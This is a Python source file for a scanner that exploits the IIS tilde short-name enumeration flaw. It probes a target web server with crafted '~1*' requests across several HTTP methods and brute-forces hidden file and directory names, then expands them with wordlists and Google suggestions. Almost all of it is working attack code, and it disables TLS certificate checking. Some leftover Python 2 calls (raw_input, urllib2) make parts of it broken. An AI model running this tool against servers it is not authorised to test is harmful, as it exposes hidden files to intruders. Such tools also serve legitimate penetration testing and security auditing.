#!/usr/bin/env python3

"""
-------------------------------------------------------------------------------
Name:       enums.py
Purpose:    Find dir/file names from the tilde enumeration vuln
Author:     Rhyru9
Fork from:  Micah Hoffman (@WebBreacher) 
Refactored by: esaBear (Code improvements and function implementation)
Migrated by:  Rhyru9 (Python 2 to Python 3 update)
-------------------------------------------------------------------------------
"""

import os
import re
import ssl
import sys
import json
import ctypes
import random
import string
import urllib.request
import urllib.error
import argparse
import itertools
from time import sleep
from urllib.parse import urlparse
from lib.getTerminalSize import getTerminalSize

ssl._create_default_https_context = ssl._create_unverified_context

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36'}
methods = ["GET","POST","OPTIONS","HEAD","TRACE","TRACK","DEBUG"]
tails = ["\\a.asp","/a.asp","\\a.aspx","/a.aspx","/a.shtml","/a.asmx","/a.ashx","/a.config","/a.php","/a.jpg","","/a.xxx"]
targets = []
findings_new = []
findings_ignore = []
findings_file = []
findings_dir = []
path_wordlists = 'wordlists/big.txt'
path_exts = 'wordlists/extensions.txt'
path_exts_ignore = 'wordlists/extensions_ignore.txt'
wordlists = []
exts = []
exts_ignore = []
chars = 'abcdefghijklmnopqrstuvwxyz1234567890-_()'
response_profile = {}
response_profile['error'] = {}
counter_requests = 0
using_method = "GET"
using_tail = "*~1*/.aspx"
if os.name == "nt":
    std_out_handle = ctypes.windll.kernel32.GetStdHandle(-11)

columns, rows = getTerminalSize()
spacebar = " " * columns + '\r'


def printResult(msg, color='', level=1):
    global spacebar
    if args.verbose_level >= level:
        sys.stdout.write(spacebar)
        sys.stdout.flush()
        if color:
            if os.name == "nt":
                ctypes.windll.kernel32.SetConsoleTextAttribute(std_out_handle, color)
                print (msg)
                ctypes.windll.kernel32.SetConsoleTextAttribute(std_out_handle, bcolors.ENDC)
            else:
                print(color + msg + bcolors.ENDC)
        else:
            print (msg)
    if args.out_file:
        if args.verbose_level >= level or level == 1:
            f = open(args.out_file, 'a+')
            f.write(msg + '\n')
            f.close()

def errorHandler(errorMsg="", forcePrint=True, forceExit=False):
    printResult('[!]  ' + errorMsg, bcolors.RED)
    printResult('[-] Paused! Do you want to exit? (y/N):')
    ans = raw_input()
    if ans.lower() == 'y':
        if forcePrint: printFindings()
        sys.exit()
    else:
        return

def getWebServerResponse(url, method=False):
    global spacebar, counter_requests, using_method
    
    method = method if method is not False else using_method
    
    try:
        if args.verbose_level:
            sys.stdout.write(spacebar)
            sys.stdout.write("[*]  Testing: %s \r" % url)
            sys.stdout.flush()
        sleep(args.wait)
        
        counter_requests += 1
        req = urllib.request.Request(url, None, headers)
        req.get_method = lambda: method
        response = urllib.request.urlopen(req)
        return response
    except urllib.error.HTTPError as e:
        #ignore HTTPError (404, 400 etc)
        return e
    except urllib.error.URLError as e:
        errorHandler('Connection URLError: ' + str(e.reason))
        return getWebServerResponse(url, method)
    except Exception as e:
        errorHandler('Connection Error: Unknown')
        return getWebServerResponse(url, method)

def getGoogleKeywords(prefix):
    try:
        # ganti urllib2.Request dan urllib2.urlopen
        req = urllib.request.Request('http://suggestqueries.google.com/complete/search?q=%s&client=firefox&hl=en' % prefix)
        resp = urllib.request.urlopen(req)
        result_resp = json.loads(resp.read())
        result = []
        
        for word in result_resp[1]:
            keywords = re.findall("[" + chars + "]+", word)
            result.append(keywords[0])
            if len(keywords):
                result.append("".join(keywords))
        
        return list(set(result))
    
    except urllib.error.URLError as e:
        printResult('[!]  There is an error when retrieving keywords from Google: %s, skipped' % str(e.reason), bcolors.RED)
        return []
    except Exception as e:
        printResult('[!]  There is an unknown error when retrieving keywords from Google, skipped', bcolors.RED)
        return []

        
def file2List(path):
    if not os.path.isfile(path):
        printResult('[!]  Path %s not exists, change path relative to the script file' % path, bcolors.GREEN, 2)
        path = os.path.dirname(__file__) + os.sep + path
    if not os.path.isfile(path):
        printResult('[!]  Error. Path %s not existed.' % path, bcolors.RED)
        sys.exit()
    try:
        return [line.strip().lower() for line in open(path)]
    except IOError as e:
        printResult('[!]  Error while reading files. %s' % (e.strerror), bcolors.RED)
        sys.exit()

def initialCheckUrl(url):
    u = urlparse(url)

    not_there_string = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for x in range(13))
    printResult('[-]  Testing with dummy file request %s://%s%s%s.htm' % (u.scheme, u.netloc, u.path, not_there_string), bcolors.GREEN)
    not_there_url = u.scheme + '://' + u.netloc + u.path + not_there_string + '.htm'

    not_there_response = getWebServerResponse(not_there_url)

    not_there_response_content_length = len(not_there_response.read())

    if not_there_response.getcode():
        printResult('[-]    URLNotThere -> HTTP Code: %s, Response Length: %s' % (not_there_response.getcode(), not_there_response_content_length))
        response_profile['not_there_code'], response_profile['not_there_length'] = not_there_response.getcode(), not_there_response_content_length
    else:
        printResult('[+]    URLNotThere -> HTTP Code: %s, Error Code: %s' % (not_there_response.code, not_there_response.reason))
        response_profile['not_there_code'], response_profile['not_there_reason'] = not_there_response.code

    if response_profile['not_there_code'] != 404:
        printResult('[!]  FALSE POSITIVE ALERT: We may have a problem determining real responses since we did not get a 404 back.', bcolors.RED)

    printResult('[-]  Testing with user-submitted %s' % url, bcolors.GREEN)
    url_response = getWebServerResponse(url)
    if url_response.getcode():
        response_profile['user_length'] = len(url_response.read())
        response_profile['user_code'] = url_response.getcode()
        printResult('[-]    URLUser -> HTTP Code: %s, Response Length: %s' % (response_profile['user_code'], response_profile['user_length']))
    else:
        printResult('[+]    URLUser -> HTTP Code: %s, Error Code: %s' % (url_response.code, url_response.reason))
        response_profile['user_code'], response_profile['user_reason'] = url_response.code, url_response.reason

    if response_profile['user_code'] != 200:
        printResult('[!]  WARNING: We did not receive an HTTP response code 200 back with given url.', bcolors.RED)
        #sys.exit()

def checkVulnerable(url):
    global methods, using_method

    check_string = '*~1*/.aspx' if args.limit_extension is None else '*~1'+args.limit_extension+'/.aspx'

    if args.f:
        printResult('[!]  You have used the -f switch to force us to scan. Well played. Using the IIS/6 "*~1*/.aspx" string.', bcolors.YELLOW)
        return check_string

    server_header = getWebServerResponse(url)
    if 'server' in server_header.headers:
        if 'IIS' in server_header.headers['server'] or 'icrosoft' in server_header.headers['server']:
            printResult('[+]  The server is reporting that it is IIS (%s).' % server_header.headers['server'], bcolors.GREEN)
            if   '5.' in server_header.headers['server']:
                check_string = '*~1*'
            elif '6.' in server_header.headers['server']:
                pass 
        else:
            printResult('[!]  Warning. Server is not reporting that it is IIS.', bcolors.RED)
            printResult('[!]     (Response code: %s)' % server_header.getcode(), bcolors.RED)
    else:
        printResult('[!]  Error. Server is not reporting that it is IIS.', bcolors.RED)
        printResult('[!]     (Response code: %s)' % server_header.getcode(), bcolors.RED)

    # cek jika vuln terhadap tilde enum hehehehe
    isVulnerable = False
    for m in methods:
        resp1 = getWebServerResponse(args.url + '~1*/.aspx', method=m)
        resp2 = getWebServerResponse(args.url + '*~1*/.aspx', method=m)
        if resp1.code != resp2.code:
            printResult('[+]  The server is vulnerable to the IIS tilde enumeration vulnerability..', bcolors.YELLOW)
            printResult('[+]  Using HTTP METHOD: %s' % m, bcolors.GREEN)
            isVulnerable = True
            using_method = m
            break

    if isVulnerable == False:
        printResult('[!]  Error. Server is probably NOT vulnerable or given path is wrong.', bcolors.RED)
        printResult('[!]     If you know it is, use the -f flag to force testing and re-run the script.', bcolors.RED)
        sys.exit()
        
    return check_string

def addNewFindings(findings=[]):
    findings_new.extend(findings)
    
def findExtensions(url, filename):
    possible_exts = {}
    found_files = []
    notFound = True
    _filename = filename.replace("~","*~")

    if args.limit_extension:
        notFound = False
        resp = getWebServerResponse(url+_filename+args.limit_extension+'*/.aspx')
        if resp.code == 404:
            possible_exts[args.limit_extension[1:]] = 1
    elif not args.limit_extension == '':
        for char1 in chars:
            resp1a = getWebServerResponse(url+_filename+'*'+char1+'*/.aspx')
            if resp1a.code == 404:  
                notFound = False
                possible_exts[char1] = 1
                for char2 in chars:
                    resp2a = getWebServerResponse(url+_filename+'*'+char1+char2+'*/.aspx')
                    if resp2a.code == 404:  
                        if char1 in possible_exts: del possible_exts[char1]
                        possible_exts[char1+char2] = 1
                        for char3 in chars:
                            resp3a = getWebServerResponse(url+_filename+'*'+char1+char2+char3+'/.aspx')
                            if resp3a.code == 404:  
                                if char1+char2 in possible_exts: del possible_exts[char1+char2]
                                possible_exts[char1+char2+char3] = 1
    
    # Check if it's a directory
    if not args.limit_extension and confirmDirectory(url, filename):
        notFound = False
        addNewFindings([filename+'/'])
        printResult('[+]  Enumerated directory:  ' +filename+'/', bcolors.YELLOW)

    if notFound:
        addNewFindings([filename+'/'])
        printResult('[!]  Something is wrong:  %s%s/ should be a directory, but the response is strange.'%(url,filename), bcolors.RED)
    else:
        possible_exts = sorted(possible_exts.keys(), key=len, reverse=True)
        while possible_exts:
            item = possible_exts.pop()
            if not any(map(lambda s:s.endswith(item), possible_exts)):
                printResult('[+]  Enumerated file:  ' +filename+'.'+item, bcolors.YELLOW)
                found_files.append(filename+'.'+item)
        addNewFindings(found_files)
    return

def confirmDirectory(url, filename):
    resp = getWebServerResponse(url + filename + '/.aspx')
    if resp.code == 404 and 'x-aspnet-version' not in resp.headers:
        return True
    else:
        return False

def counterEnum(url, check_string, found_name):
    # Enumerate ~2 ~3 and so on
    foundNameWithCounter = [found_name+'~1']
    lastCounter = 1
    for i in range(2, 10):
        test_name = '%s~%d' % (found_name, i)
        test_url = url + test_name + '*/.aspx'
        resp = getWebServerResponse(test_url)
        if resp.code == 404:
            foundNameWithCounter.append(test_name)
            lastCounter = i
        else: 
            break

    if lastCounter > 1:
        printResult('[+]  counterEnum: %s~1 to ~%d.'%(found_name,lastCounter), bcolors.GREEN, 2)
    for filename in foundNameWithCounter:
        findExtensions(url, filename)

def charEnum(url, check_string, current_found):
    notFound = True
    current_length = len(current_found)
    if current_length >= 6:
        counterEnum(url, check_string, current_found)
        return
    elif current_length > 0 and not args.limit_extension == '':
        test_url = url + current_found + check_string[1:]
        resp = getWebServerResponse(test_url)
        if resp.code == 404:
            counterEnum(url, check_string, current_found)
            notFound = False
    
    for char in chars:
        test_name = current_found + char
        if args.resume_string and test_name < args.resume_string[:current_length+1]: continue
        
        resp = getWebServerResponse(url + test_name + check_string)
        if resp.code == 404:
            charEnum(url, check_string, test_name)
            notFound = False
    if notFound:
        printResult('[!]  Something is wrong:  %s%s[?] cannot continue. Maybe not in searching charcters.'%(url,current_found), bcolors.RED)
    
def checkEightDotThreeEnum(url, check_string, dirname='/'):

    url = url + dirname

    charEnum(url, check_string, '')
    printResult('[-]  Finished doing the 8.3 enumeration for %s.' % dirname, bcolors.GREEN)
    args.resume_string = ''
    return

def confirmUrlExist(url, isFile=True):
    resp = getWebServerResponse(url, method="GET")
    if resp.code != response_profile['not_there_code']:
        size = len(resp.read())
        if response_profile['not_there_code'] == 404:
            return True
        elif not isFile and resp.code == 301:
            return True
        elif isFile and resp.code == 500:
            return True
        elif size != response_profile['not_there_length']:
            return True
        else:
            printResult('[!]  Strange. Not sure if %s is existed.' % url, bcolors.YELLOW, 2)
            printResult('[!]     Response code=%s, size=%s' % (resp.code, size), bcolors.ENDC, 2)
    return False

def urlPathEnum(baseUrl, prefix, possible_suffixs, possible_extensions, isFile):
    ls = len(possible_suffixs)
    le = len(possible_extensions)
    printResult("[-]  urlPathEnum: '%s' + %d suffix(s) + %d ext(s) = %d requests"% (prefix,ls,le,ls*le), bcolors.ENDC, 2)
    
    counter = 0
    for suffix in possible_suffixs:
        if isFile:
            for extension in possible_extensions:
                if confirmUrlExist(baseUrl + prefix + suffix + '.' + extension):
                    findings_file.append(prefix + suffix + '.' + extension)
                    counter += 1
        elif confirmUrlExist(baseUrl + prefix + suffix, False):
            findings_dir.append(prefix + suffix + '/')
            counter += 1
    return counter
    
def wordlistRecursive(url, prefix, suffix, possible_extensions, isFile):
    if suffix == '': return 0 
    
    words_startswith = [word for word in wordlists if word.startswith(suffix) and word != suffix]
    words_startswith.append(suffix)

    if args.enable_google:
        words_startswith.extend(getGoogleKeywords(suffix))

    foundNum = urlPathEnum(url, prefix, list(set(words_startswith)), possible_extensions, isFile)
    if foundNum: return foundNum
    
    for word in wordlists:
        if len(word) > 1 and suffix.startswith(word):
            foundNum = wordlistRecursive(url, prefix + word, suffix[len(word):], possible_extensions, isFile)
            if foundNum: return foundNum
    
    return wordlistRecursive(url, prefix + suffix[0], suffix[1:], possible_extensions, isFile)
    
def wordlistEnum(url):
    for finding in findings_new:
        isFile = True
        possible_exts = []
        
        if finding.endswith('/'):
            isFile = False
            finding = finding[:-1] + '.' 
            
        (filename, ext) = finding.split('.')
        if filename[-1] != '1':
            break 
        filename = filename[:-2]

        if isFile:
            possible_exts = [extension for extension in exts if extension.startswith(ext) and extension != ext]
            possible_exts.append(ext)

        foundNum = wordlistRecursive(url, '', filename, possible_exts, isFile)
        if foundNum: continue

def printFindings():
    printResult('[+] Total requests sent: %d'% counter_requests)
    if findings_new or findings_ignore or findings_file or findings_dir:
        printResult('\n---------- OUTPUT START ------------------------------')
        printResult('[+] Raw results: %s'% (len(findings_new) if findings_new else 'None.'))
        for finding in sorted(findings_new):
            printResult(args.url + finding)
        
        if findings_ignore:
            printResult('\n[+] Ignored results: %s'% len(findings_ignore))
            for finding in sorted(findings_ignore):
                printResult(args.url + finding)
            
        printResult('\n[+] Existing files found: %s'% (len(findings_file) if findings_file else 'None.'))
        for finding in sorted(findings_file):
            printResult(args.url + finding)
            
        printResult('\n[+] Existing Directories found: %s'% (len(findings_dir) if findings_dir else 'None.'))
        for finding in sorted(findings_dir):
            printResult(args.url + finding)
        printResult('---------- OUTPUT COMPLETE ---------------------------\n\n\n')
    else:
        printResult('[!]  No Result Found!\n\n\n', bcolors.RED)
        

def main():
    try:
        if args.url:
            if args.url[-1:] != '/':
                args.url += '/'
            initialCheckUrl(args.url)
        else:
            printResult('[!]  You need to enter a valid URL for us to test.', bcolors.RED)
            sys.exit()
            
        if args.limit_extension is not None:
            if args.limit_extension:
                args.limit_extension = args.limit_extension[:3]
                printResult('[-]  --limit-ext is set. Find names end with given extension only: %s'% (args.limit_extension), bcolors.GREEN)
                args.limit_extension = '*' + args.limit_extension
            else:
                printResult('[-]  --limit-ext is set. Find directories only.', bcolors.GREEN)
            
        if args.resume_string:
            printResult('[-]  Resume from "%s"... characters before this will be ignored.' % args.resume_string, bcolors.GREEN)

        if args.wait != 0 :
            printResult('[-]  User-supplied delay detected. Waiting %s seconds between HTTP requests.' % args.wait)

        if args.path_wordlists:
            printResult('[-]  Asigned wordlists file: %s' % args.path_wordlists)
        else:
            args.path_wordlists = path_wordlists
            printResult('[-]  Wordlists file was not asigned, using: %s' % args.path_wordlists)
            
        if args.path_exts:
            printResult('[-]  Asigned extensions file: %s' % args.path_exts)
        else:
            args.path_exts = path_exts
            printResult('[-]  Extensions file was not asigned, using: %s' % args.path_exts)
        
        if args.path_exts_ignore:
            printResult('[-]  Asigned ignorable extensions file: %s' % args.path_exts_ignore)
        else:
            args.path_exts_ignore = path_exts_ignore
            printResult('[-]  Ignorable file was not asigned, using: %s' % args.path_exts_ignore)
            
        printResult('[+]  HTTP Response Codes: %s' % response_profile, bcolors.PURPLE, 2)

        check_string = checkVulnerable(args.url)

        url = urlparse(args.url)
        url_ok = url.scheme + '://' + url.netloc + url.path

        wordlists.extend(file2List(args.path_wordlists))
        exts.extend(file2List(args.path_exts))
        exts_ignore.extend(file2List(args.path_exts_ignore))
        
    except KeyboardInterrupt:
        sys.exit()

    try:
        checkEightDotThreeEnum(url.scheme + '://' + url.netloc, check_string, url.path)
    except KeyboardInterrupt:
        sys.stdout.write(' (interrupted!) ...\n') 
        printResult('[!]  Stop tilde enumeration manually. Try wordlist enumeration from current findings now...', bcolors.RED)

    try:
        # separate ignorable extension from findings
        findings_ignore.extend([f for f in findings_new for e in exts_ignore if f.endswith(e)])
        findings_new[:] = [f for f in findings_new if f not in findings_ignore]
        # find real path by wordlist enumerate
        wordlistEnum(url_ok)
    except KeyboardInterrupt:
        sys.stdout.write(' (interrupted!) ...\n') 
        sys.exit()

    printFindings()
    return


parser = argparse.ArgumentParser(description='Exploits and expands the file names found from the tilde enumeration vuln')
parser.add_argument('-c', dest='cookie', help='Cookie Header value')
parser.add_argument('-d', dest='path_wordlists', help='Path of wordlists file')
parser.add_argument('-e', dest='path_exts', help='Path of extensions file')
parser.add_argument('-f', action='store_true', default=False, help='Force testing even if the server seems not vulnerable')
parser.add_argument('-g', action='store_true', default=False, dest='enable_google', help='Enable Google keyword suggestion to enhance wordlists')
parser.add_argument('-o', dest='out_file',default='', help='Filename to store output')
parser.add_argument('-p', dest='proxy',default='', help='Use a proxy host:port')
parser.add_argument('-u', dest='url', help='URL to scan')
parser.add_argument('-v', dest='verbose_level', type=int, default=1, help='verbose level of output (0~2)')
parser.add_argument('-w', dest='wait', default=0, type=float, help='time in seconds to wait between requests')
parser.add_argument('--ignore-ext', dest='path_exts_ignore', help='Path of ignorable extensions file')
parser.add_argument('--limit-ext', dest='limit_extension', help='Enumerate for given extension only') 
parser.add_argument('--resume', dest='resume_string', help='Resume from a given name (length lt 6)')
args = parser.parse_args()


if not os.name == "nt":
    class bcolors:
        PURPLE = '\033[95m'        
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'        
        YELLOW = '\033[93m'       
        RED = '\033[91m'       
        ENDC = '\033[0m'       

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

else:
    class bcolors:
        PURPLE = 0x05
        CYAN = 0x0B
        DARKCYAN = 0x03
        BLUE = 0x09
        GREEN = 0x0A
        YELLOW = 0x0E
        RED = 0x0C
        ENDC = 0x07

        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.DARKCYAN = ''

if args.proxy:
    printResult('[-]  Using proxy for requests: ' + args.proxy, bcolors.PURPLE)
    proxy = urllib2.ProxyHandler({'http': args.proxy, 'https': args.proxy})
    opener = urllib2.build_opener(proxy)
    urllib2.install_opener(opener)

if args.verbose_level > 1:
    printResult('[-]  Verbose Level=%d ....brace yourself for additional information.'%args.verbose_level, bcolors.PURPLE, 2)

if __name__ == "__main__": main()
